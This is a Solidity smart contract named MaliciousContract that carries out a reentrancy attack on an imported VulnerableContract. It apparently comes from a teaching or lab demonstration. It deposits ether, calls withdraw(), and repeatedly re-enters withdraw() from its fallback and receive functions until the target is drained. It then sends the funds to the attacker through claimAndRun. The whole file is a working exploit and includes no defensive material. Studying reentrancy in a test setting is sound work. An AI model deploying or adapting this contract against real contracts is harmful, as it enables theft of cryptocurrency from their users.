// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./VulnerableContract.sol";

contract MaliciousContract {
    address payable public vulnerableScAddress;
    address payable public attacker;

    constructor(address payable _vulnerableScAddress) {
        vulnerableScAddress = _vulnerableScAddress;
        attacker = payable(msg.sender);
    }

    fallback() external payable {
        // Recursive call until funds are drained.
        if (vulnerableScAddress.balance >= 1 ether) {
            vulnerableScAddress.call(abi.encodeWithSignature("withdraw()"));
        }
    }

    receive() external payable {
        // Recursive call until funds are drained.
        if (vulnerableScAddress.balance >= 1 ether) {
            vulnerableScAddress.call(abi.encodeWithSignature("withdraw()"));
        }
    }

    function attack() public payable {
        // Deposits first time.
        require(msg.value >= 1 ether, "Need to send at least 1 eth.");
        vulnerableScAddress.call{value: msg.value}(
            abi.encodeWithSignature("deposit()")
        );

        // Triggers withraw vulnerability.
        vulnerableScAddress.call(abi.encodeWithSignature("withdraw()"));
    }

    function claimAndRun() public {
        require(msg.sender == attacker, "not your bounty, buddy.");
        attacker.transfer(address(this).balance);
    }
}
